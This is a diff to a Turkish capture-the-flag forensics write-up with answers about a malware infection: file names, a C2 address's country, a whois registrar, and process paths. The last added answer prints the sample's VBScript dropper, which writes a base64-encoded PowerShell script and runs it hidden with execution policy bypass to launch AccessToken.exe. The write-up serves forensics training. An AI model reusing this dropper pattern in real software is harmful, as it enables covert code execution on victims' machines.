@@ -1164,6 +1164,7 @@ Pacific Tarih: 2022-03-34 07:11:49
 ![image](https://user-images.githubusercontent.com/88983987/220950674-803a4ddc-a378-409a-9c91-e23ae5953afd.png)
 
 Cevap:
+
 ```8 Dosya```
 
 # 30. Soru
@@ -1178,6 +1179,7 @@ Dosyayı 2022.7z içerisinden "adeopass" şifresi ile çıkarttıktan sonra sağ
 ![image](https://user-images.githubusercontent.com/88983987/220951735-d27df29f-2ca4-486f-8983-fb680e571047.png)
 
 Cevap:
+
 ```Megha Sharma```
 
 # 31. Soru
@@ -1192,6 +1194,7 @@ Dosyayı 2022.7z içerisinden "adeopass" şifresi ile çıkarttıktan sonra sağ
 ![image](https://user-images.githubusercontent.com/88983987/220952315-2de937c6-ab9e-4430-8314-39852b718411.png)
 
 Cevap:
+
 ```9.03.2022 09:51```
 
 # 32. Soru
@@ -1206,6 +1209,7 @@ Daha önceden bulduğumuz "ofbahar.com" adresine whois sorgusu atıyoruz.
 ![image](https://user-images.githubusercontent.com/88983987/220952732-b25c4447-f4a6-4a07-9980-5971802b6451.png)
 
 Cevap:
+
 ```GoDaddy```
 
 # 33. Soru
@@ -1220,6 +1224,7 @@ Malware'imizin "68.138.67.198" adresinden iletişim kurduğunu saptamıştık. �
 ![image](https://user-images.githubusercontent.com/88983987/220954187-2b7d2927-a395-4582-ab39-01984fb1f7e9.png)
 
 Cevap:
+
 ```United States```
 
 # 34. Soru
@@ -1232,6 +1237,7 @@ Cevap:
 Wireshark üzerinde 3 adet, imaj dosyası içinde 1 adet malware tespit etmiştik. Wireshark içindekilerden birisi makro kodu, ikisi executable dosyalar. İmaj içindeki ise makro içeren bir Excel belgesi.
 
 Cevap:
+
 ```
 BodyMassIndex.exe
 accesstoken.exe
@@ -1245,6 +1251,7 @@ accesstoken.exe
 Wireshark üzerinde 3 adet, imaj dosyası içinde 1 adet malware tespit etmiştik. Wireshark içindekilerden birisi makro kodu, ikisi executable dosyalar. İmaj içindeki ise makro içeren bir Excel belgesi. Fakat "vbs" dosyası bir "ps1" dosyası üretiyor. Bunu da ekleyeceğiz.
 
 Cevap:
+
 ```
 notamalware.vbs
 notabadpowershell.ps1
@@ -1261,6 +1268,7 @@ BodyMassIndex.xlsm
 Kaynak: https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens
 
 Cevap:
+
 ```
 Abusing Tokens
 ```
@@ -1276,6 +1284,7 @@ Abusing Tokens
 ![image](https://user-images.githubusercontent.com/88983987/220957992-cb3bb218-dd91-43cf-9259-af016848ffce.png)
 
 Cevap:
+
 ```
 winlogon.exe
 ```
@@ -1291,6 +1300,7 @@ winlogon.exe
 ![image](https://user-images.githubusercontent.com/88983987/220236205-4c5a885b-0233-470f-8fda-d92fd24ee116.png)
 
 Cevap:
+
 ```
 C:\Users\RickMartinGrimes\AppData\Loca\Temp\BodyMassIndex.exe
 ```
@@ -1301,6 +1311,26 @@ C:\Users\RickMartinGrimes\AppData\Loca\Temp\BodyMassIndex.exe
 > What is the command contained in the malicious file with the “ps1” extension ?
 
 ## Solution
+
+Cevap:
+
+"notabadpowershell.ps1" dosyasının "notamalware.vbs dosyası tarafından oluşturulduğunu saptayıp decode etmiştik.
+```
+Dim filesys, filetxt, getname, path
+    Set filesys = CreateObject("Scripting.FileSystemObject")
+    Set filetxt = filesys.CreateTextFile("C:\Users\RickMartinGrimes\AppData\Local\Temp\notabadpowershell.ps1", True)
+    filetxt.WriteLine ("powershell -enc UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAEMAOgBcAFUAcwBlAHIAcwBcAFIAaQBjAGsATQBhAHIAdABpAG4ARwByAGkAbQBlAHMAXABBAHAAcABEAGEAdABhAFwATABvAGMAYQBsAFwAVABlAG0AcABcAEEAYwBjAGUAcwBzAFQAbwBrAGUAbgAuAGUAeABlAA==")
+    Set oshell = CreateObject("WScript.Shell")
+	filetxt.Close
+    oshell.Run "powershell -exec bypass C:\Users\RickMartinGrimes\AppData\Local\Temp\notabadpowershell.ps1", 0, True D
+```
+
+Bu dosya, çalıştırıldığında ```"C:\Users\RickMartinGrimes\AppData\Local\Temp\"``` konumunda, ```notabadpowershell.ps1``` adında bir dosya oluşturuyor. Ardından içerisine base64 ile kodlanmış metini yerleştiriyor ve dosyayı çalıştırıyor. 
+
+Cevap:
+```
+Start-Process C:\Users\RickMartinGrimes\AppData\Local\Temp\AccessToken.exe
+```
 
 # 40. Soru
 
